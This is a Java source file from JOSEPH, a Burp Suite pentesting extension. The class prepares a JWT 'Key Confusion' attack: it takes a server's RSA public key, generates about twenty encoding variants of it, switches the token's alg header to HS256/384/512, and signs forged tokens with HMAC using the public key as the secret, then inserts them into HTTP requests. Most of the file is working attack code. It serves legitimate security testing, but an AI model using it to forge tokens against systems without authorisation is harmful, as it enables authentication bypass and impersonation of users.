/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks.KeyConfusion;

import burp.*;

import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
import eu.dety.burp.joseph.attacks.IAttackInfo;
import eu.dety.burp.joseph.attacks.KeyConfusion.KeyConfusion;
import eu.dety.burp.joseph.attacks.SignatureExclusion.SignatureExclusionInfo;
import eu.dety.burp.joseph.utilities.Decoder;
import eu.dety.burp.joseph.utilities.Jwk;
import eu.dety.burp.joseph.utilities.Logger;
import org.apache.commons.codec.binary.Base64;
import org.json.simple.parser.JSONParser;

import java.awt.*;
import java.security.PublicKey;
import java.util.*;
import java.util.List;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.*;


/**
 * Key Confusion Attack Info
 * <p>
 * Class holding meta data for the Key Confusion attack
 * and for preparing all necessary parameter for the actual attack.
 *
 * @author Dennis Detering
 * @version 1.0
 */
public class KeyConfusionInfo implements IAttackInfo {
    private static final Logger loggerInstance = Logger.getInstance();
    private static final ResourceBundle bundle = ResourceBundle.getBundle("JOSEPH");

    private Decoder joseDecoder;
    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private IParameter parameter;

    // Unique identifier for the attack class
    private static final String id = "key_confusion";

    // Full name of the attack
    private static final String name = "Key Confusion";

    // Attack description
    private static final String description = "<html>The <em>Key Confusion</em> attack exploits a vulnerability where a " +
            "<em>public key</em> is mistakenly used as <em>mac secret</em>.<br/>" +
            "Such a vulnerability occurs when the endpoint expects a RSA signed token and does not correctly check the actually used or allowed algorithm.</html>";

    // List of types this attack is suitable for
    private static final List<String> suitableTypes = Arrays.asList("jwt", "jws");

    // Array of algorithms to test
    private static final String[] algorithms = {"HS256", "HS384", "HS512"};

    // Hashmap of public key variation to test
    private HashMap<payloadType, String> publicKeyVariations = new HashMap<>();

    // Amount of requests needed
    private int amountRequests = 0;

    // Types of payload variation
    private enum payloadType {
        // Derived from PEM input
        ORIGINAL,
        ORIGINAL_WITHOUT_HEADER_FOOTER,
        ORIGINAL_WITHOUT_LINE_FEEDS,
        ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS,
        ORIGINAL_TRIMMED,
        ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED,
        ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED,
        ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED,
        ORIGINAL_TRIMMED_WITH_ENDING_LINEFEED,
        ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED_WITH_ENDING_LINEFEED,
        ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED,
        ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED,

        // Derived from JWK input
        PKCS1,
        PKCS1_WITH_LINEFEEDS,
        PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER,
        PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED,
        PKCS8,
        PKCS8_WITH_LINEFEEDS,
        PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER,
        PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED,
    }

    // List of prepared requests with payload info
    private List<KeyConfusionAttackRequest> requests = new ArrayList<>();

    private JComboBox<String> publicKeySelection;
    private JTextArea publicKey;

    @Override
    public KeyConfusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, IParameter parameter) throws AttackPreparationFailedException {
        this.joseDecoder = new Decoder();
        this.helpers = callbacks.getHelpers();
        this.requestResponse = requestResponse;
        this.parameter = parameter;

        this.publicKeyVariations.clear();
        this.requests.clear();

        String publicKeyValue = publicKey.getText();

        // Throw error if public key value is empty
        if(publicKeyValue.isEmpty()) {
            throw new AttackPreparationFailedException(bundle.getString("PROVIDE_PUBKEY"));
        }

        // Parse public key according to selected format
        int publickKeyFormat = publicKeySelection.getSelectedIndex();

        switch (publickKeyFormat) {
            // JWK (JSON)
            case 1:
                loggerInstance.log(getClass(), "Key format is JWK:  " + publicKeyValue, Logger.LogLevel.DEBUG);

                try {
                    Object publickKeyValueJson = new JSONParser().parse(publicKeyValue);

                    loggerInstance.log(getClass(), "" + publickKeyValueJson, Logger.LogLevel.DEBUG);

                    List<PublicKey> publicKeys = Jwk.getRsaPublicKeys(publickKeyValueJson);

                    for (PublicKey publicKey : publicKeys) {
                        loggerInstance.log(getClass(), "Encoded PubKey: " + Base64.encodeBase64String(publicKey.getEncoded()) + "\nFormat: " + publicKey.getFormat(), Logger.LogLevel.DEBUG);

                        // PKCS#8 / X.509
                        publicKeyVariations.put(payloadType.PKCS8, Base64.encodeBase64String(publicKey.getEncoded()));

                        // PKCS#1, easy but hacky transformation
                        publicKeyVariations.put(payloadType.PKCS1, Base64.encodeBase64String(Arrays.copyOfRange(publicKey.getEncoded(), 24, publicKey.getEncoded().length)));

                        // With line feeds
                        Base64 base64Pem = new Base64(64, "\n".getBytes("UTF-8"));
                        publicKeyVariations.put(payloadType.PKCS8_WITH_LINEFEEDS, base64Pem.encodeToString(publicKey.getEncoded()));
                        publicKeyVariations.put(payloadType.PKCS1_WITH_LINEFEEDS, base64Pem.encodeToString(Arrays.copyOfRange(publicKey.getEncoded(), 24, publicKey.getEncoded().length)));

                        // With line feeds and header/footer
                        publicKeyVariations.put(payloadType.PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER, "-----BEGIN PUBLIC KEY-----\n" + base64Pem.encodeToString(publicKey.getEncoded()) + "-----END PUBLIC KEY-----");
                        publicKeyVariations.put(payloadType.PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER, "-----BEGIN RSA PUBLIC KEY-----\n" + base64Pem.encodeToString(Arrays.copyOfRange(publicKey.getEncoded(), 24, publicKey.getEncoded().length)) + "-----END RSA PUBLIC KEY-----");

                        // With line feeds and header/footer and additional line feed at end
                        publicKeyVariations.put(payloadType.PKCS8_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED, "-----BEGIN PUBLIC KEY-----\n" +base64Pem.encodeToString(publicKey.getEncoded()) + "-----END PUBLIC KEY-----\n");
                        publicKeyVariations.put(payloadType.PKCS1_WITH_LINEFEEDS_AND_HEADER_FOOTER_AND_ENDING_LINEFEED, "-----BEGIN RSA PUBLIC KEY-----\n" + base64Pem.encodeToString(Arrays.copyOfRange(publicKey.getEncoded(), 24, publicKey.getEncoded().length)) + "-----END RSA PUBLIC KEY-----\n");
                    }

                } catch (Exception e) {
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_JWK"));
                }

                break;
            // PEM (String)
            default:
                loggerInstance.log(getClass(), "Key format is PEM:  " + publicKeyValue, Logger.LogLevel.DEBUG);

                // Simple check if String has valid format
                if(!publicKeyValue.trim().startsWith("-----BEGIN") && !publicKeyValue.trim().startsWith("MII")) {
                    throw new AttackPreparationFailedException(bundle.getString("NOT_VALID_PEM"));
                }

                // No modification
                publicKeyVariations.put(payloadType.ORIGINAL, publicKeyValue);

                // Without header/footer
                String publickKeyValueNoHeaderFooter = publicKeyValue.replace("-----BEGIN PUBLIC KEY-----\n", "").replace("-----END PUBLIC KEY-----", "").replace("-----BEGIN RSA PUBLIC KEY-----\n", "").replace("-----END RSA PUBLIC KEY-----", "");
                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER, publickKeyValueNoHeaderFooter);

                // Without line feeds/cariage returns
                String publickKeyValueNoLinebreaks = publicKeyValue.replaceAll("\\r\\n|\\r|\\n", "");
                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS, publickKeyValueNoLinebreaks);

                // Without header/footer and line feeds/cariage returns
                String publickKeyValueNoHeaderFooterNoLinebreaks = publickKeyValueNoHeaderFooter.replaceAll("\\r\\n|\\r|\\n", "");
                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS, publickKeyValueNoHeaderFooterNoLinebreaks);


                // Trimmed
                publicKeyVariations.put(payloadType.ORIGINAL_TRIMMED, publicKeyValue.trim());

                // Without header/footer and trimmed
                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED, publickKeyValueNoHeaderFooter.trim());

                // Without line feeds/cariage returns and trimmed
                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED, publickKeyValueNoLinebreaks.trim());

                // Without header/footer and line feeds/cariage returns and trimmed
                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED, publickKeyValueNoHeaderFooterNoLinebreaks.trim());


                // Trimmed with line feed at end
                publicKeyVariations.put(payloadType.ORIGINAL_TRIMMED_WITH_ENDING_LINEFEED, publicKeyValue.trim() + "\n");

                // Without header/footer and trimmed with line feed at end
                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_TRIMMED_WITH_ENDING_LINEFEED, publickKeyValueNoHeaderFooter.trim() + "\n");

                // Without line feeds/cariage returns and trimmed with line feed at end
                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED, publickKeyValueNoLinebreaks.trim() + "\n");

                // Without header/footer and line feeds/cariage returns and trimmed with line feed at end
                publicKeyVariations.put(payloadType.ORIGINAL_WITHOUT_HEADER_FOOTER_AND_LINE_FEEDS_TRIMMED_WITH_ENDING_LINEFEED, publickKeyValueNoHeaderFooterNoLinebreaks.trim() + "\n");

                break;
        }

        for (Map.Entry<payloadType, String> publicKey : publicKeyVariations.entrySet()) {
            for (String algorithm : algorithms) {
                try {
                    // Change the "alg" header value for each of the algorithms entries
                    byte[] request = this.requestResponse.getRequest();
                    String[] components = joseDecoder.getComponents(this.parameter.getValue());
                    String decodedHeader = joseDecoder.getDecoded(components[0]);
                    String decodedHeaderReplacedAlgorithm = decodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + algorithm + "\"");
                    String encodedHeaderReplacedAlgorithm = joseDecoder.getEncoded(decodedHeaderReplacedAlgorithm);

                    String macAlg;
                    switch(algorithm) {
                        case "HS384":
                            macAlg = "HmacSHA384";
                            break;
                        case "HS512":
                            macAlg = "HmacSHA512";
                            break;
                        default:
                            macAlg = "HmacSHA256";
                    }

                    // Generate signature
                    Mac mac = Mac.getInstance(macAlg);
                    SecretKeySpec secret_key = new SecretKeySpec(helpers.stringToBytes(publicKey.getValue()), macAlg);
                    mac.init(secret_key);
                    String newSignature = joseDecoder.getEncoded(mac.doFinal(helpers.stringToBytes(joseDecoder.concatComponents(new String[] {encodedHeaderReplacedAlgorithm, components[1]}))));

                    // Build new JWT String and update parameter
                    String[] newComponents = {encodedHeaderReplacedAlgorithm, components[1], newSignature};
                    String newComponentsConcatenated = joseDecoder.concatComponents(newComponents);

                    IParameter updatedParameter = helpers.buildParameter(this.parameter.getName(), newComponentsConcatenated, this.parameter.getType());
                    request = helpers.updateParameter(request, updatedParameter);

                    requests.add(new KeyConfusionAttackRequest(request, publicKey.getKey().ordinal(), algorithm, publicKey.getValue(), publicKey.getValue().length()));
                } catch (Exception e) {
                    throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
                }
            }
        }

        this.amountRequests = requests.size();
        return new KeyConfusion(callbacks, this);
    }

    @Override
    public String getId() {
        return id;
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public String getDescription() {
        return description;
    }

    @Override
    public List<String> getSuitableTypes() {
        return suitableTypes;
    }

    @Override
    public int getAmountRequests() {
        return amountRequests;
    }

    @Override
    public boolean getExtraUI(JPanel extraPanel) {
        GridBagConstraints constraints = new GridBagConstraints();

        // Create combobox and textarea to add public key (in different formats)
        JLabel publicKeyLabel = new JLabel(bundle.getString("PUBKEY_FORMAT"));
        publicKeySelection = new JComboBox<>();
        DefaultComboBoxModel<String> publicKeySelectionListModel= new DefaultComboBoxModel<>();
        publicKey = new JTextArea(10, 35);
        publicKey.setLineWrap(true);

        publicKeySelectionListModel.addElement("PEM (String)");
        publicKeySelectionListModel.addElement("JWK (JSON)");

        publicKeySelection.setModel(publicKeySelectionListModel);

        constraints.fill = GridBagConstraints.HORIZONTAL;
        constraints.gridy = 0;
        extraPanel.add(publicKeyLabel, constraints);

        constraints.gridy = 1;
        extraPanel.add(publicKeySelection, constraints);

        constraints.gridy = 2;
        extraPanel.add(publicKey, constraints);

        return true;
    }

    @Override
    public boolean isSuitable(String type, String algorithm) {
        return true;
    }

    @Override
    public IHttpRequestResponse getRequestResponse() {
        return this.requestResponse;
    }

    @Override
    public List<KeyConfusionAttackRequest> getRequests() {
        return this.requests;
    }
}